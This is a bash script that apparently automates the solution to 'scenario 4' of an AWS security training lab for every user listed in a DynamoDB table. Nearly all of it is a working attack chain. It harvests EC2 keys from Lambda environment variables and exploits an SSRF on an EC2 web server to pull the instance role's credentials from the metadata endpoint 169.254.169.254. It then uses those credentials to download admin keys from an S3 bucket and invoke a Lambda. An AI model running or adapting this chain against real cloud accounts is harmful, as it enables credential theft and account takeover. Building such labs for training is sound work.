#!/bin/bash
data_base=($(aws dynamodb scan --table-name users --profile $1))
user_email=($(echo ${data_base[@]} | jq .Items[].email.S | tr -d '"'))
name=($(echo ${data_base[@]} | jq .Items[].email.S | tr -d '"' | cut -d @ -f 1))
secret_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario4.M.secret_key.S | tr -d '"'))
access_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario4.M.access_key.S | tr -d '"'))
username=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario4.M.username.S | tr -d '"'))
completion_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario4.M.completion_key.S | tr -d '"'))

if [ ! -f ~/.aws/config_bacup ]
  then
    cp ~/.aws/config ~/.aws/config_bacup
    cp ~/.aws/credentials ~/.aws/credentials_bacup
fi
#lambda_list_functions=($(aws lambda list-functions --profile $1))
# describe_instances1=($(aws ec2 describe-instances --profile $1))
# public_ip_address=($(echo ${describe_instances[@]} | jq .Reservations[].Instances[] | jq '.PublicIpAddress'+'.KeyName' | tr -d '"' | grep "s4-ec2-key-pair" | sed 's/s4-ec2-key-pair//' | cut -d - -f1))
# role_name=($(curl http://${public_ip_address1}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ | grep "s4-ec2-role"))
# token=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .Token | tr -d '"')
# access_key_id=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .AccessKeyId | tr -d '"')
# secret_access_key=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .SecretAccessKey | tr -d '"')

# echo "aws configure --profile user${i}"
# #echo "   -*- set aws_access_key_id: ${access_key_id}"
# aws configure set aws_access_key_id ${access_key_id} --profile user_4
# #echo "   -*- set aws_secret_access_key: ${secret_access_key}"
# aws configure set aws_secret_access_key ${secret_access_key} --profile user_4
# #echo "   -*- set region: eu-central-1"
# aws configure set region eu-central-1 --profile user_4
# #echo "   -*- set output: json"
# aws configure set output json --profile user_4
# #echo "   -*- set aws_session_token: ${token}"
# aws configure set aws_session_token ${token} --profile user_4

for ((i = 0; i < ${#user_email[@]}; i++))
    do
        echo "-----------------------------------------------------"
        echo ${username[i]}": "${user_email[i]}": "${access_key[i]}": "${secret_key[i]}
        echo "aws configure --profile ${name[i]}_1"
        aws configure set aws_access_key_id ${access_key[i]} --profile ${name[i]}_1
        aws configure set aws_secret_access_key ${secret_key[i]} --profile ${name[i]}_1
        aws configure set region eu-central-1 --profile ${name[i]}_1
        aws configure set output json --profile ${name[i]}_1

        echo "aws configure --profile ${name[i]}_2"
        lambda_list_functions=($(aws lambda list-functions --profile ${name[i]}_1))
        access_key2=($(echo ${lambda_list_functions[@]} | jq .Functions[].Environment.Variables | sed 's/null//' | jq .EC2_ACCESS_KEY_ID | sed 's/null//' | tr -d '"'))
        echo "access_key2:  ${access_key2}"
        secret_key2=($(echo ${lambda_list_functions[@]} | jq .Functions[].Environment.Variables | sed 's/null//' | jq .EC2_SECRET_KEY_ID | sed 's/null//' | tr -d '"'))
        echo "secret_key2:  ${secret_key2}"
        aws configure set aws_access_key_id ${access_key2} --profile ${name[i]}_2
        aws configure set aws_secret_access_key ${secret_key2} --profile ${name[i]}_2
        aws configure set region eu-central-1 --profile ${name[i]}_2
        aws configure set output json --profile ${name[i]}_2

        echo "get access_key_id & secret_access_key"
        describe_instances=($(aws ec2 describe-instances --profile ${name[i]}_2))
        public_ip_address=($(echo ${describe_instances[@]} | jq .Reservations[].Instances[] | jq '.PublicIpAddress'+'.KeyName' | tr -d '"' | grep "sc4-ec2-key-pair" | sed 's/sc4-ec2-key-pair//'))
        echo "public_ip_address: " ${public_ip_address}
        #role_name=($(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials | grep "sс4-ec2-role"))
        role_name=($(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials | grep "sc4-ec2-role"))
        echo "role_name: " ${role_name}
        token=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .Token | tr -d '"')
        access_key_id=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .AccessKeyId | tr -d '"')
        echo "access_key_id: " ${access_key_id}
        secret_access_key=$(curl http://${public_ip_address}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name} | sed -e '1,6d'| jq .SecretAccessKey | tr -d '"')
        echo "secret_access_key: " ${secret_access_key}

        echo "aws configure --profile user_4"
        #echo "   -*- set aws_access_key_id: ${access_key_id}"
        aws configure set aws_access_key_id ${access_key_id} --profile user_4
        #echo "   -*- set aws_secret_access_key: ${secret_access_key}"
        aws configure set aws_secret_access_key ${secret_access_key} --profile user_4
        #echo "   -*- set region: eu-central-1"
        aws configure set region eu-central-1 --profile user_4
        #echo "   -*- set output: json"
        aws configure set output json --profile user_4
        #echo "   -*- set aws_session_token: ${token}"
        aws configure set aws_session_token ${token} --profile user_4

        s3_ls=($(aws s3 ls --profile user_4 | grep sc4-secret-s3-bucket | cut -d ' ' -f3))
        aws s3 ls --profile user_4 s3://${s3_ls}
        aws s3 cp --profile user_4 s3://${s3_ls}/admin-user.txt ./sc4/${name[i]}.txt
        key=($(cat ./sc4/${name[i]}.txt))
        echo ${key[@]}

        aws configure set aws_access_key_id ${key[0]} --profile user_4_2${i}
        aws configure set aws_secret_access_key ${key[1]} --profile user_4_2${i}
        aws configure set region eu-central-1 --profile user_4_2${i}
        aws configure set output json --profile user_4_2${i}
        function_name=($(echo ${lambda_list_functions[@]} | jq .Functions[].FunctionName | grep "Sc4InvokeMe" | tr -d '"'))
        echo "function_name: "${function_name}
        aws lambda invoke --cli-binary-format raw-in-base64-out --function-name ${function_name} --profile user_4_2${i} --payload "{\"key\": \"${completion_key[i]}\"}" response.json
        echo "-----------------------------------------------------"
    done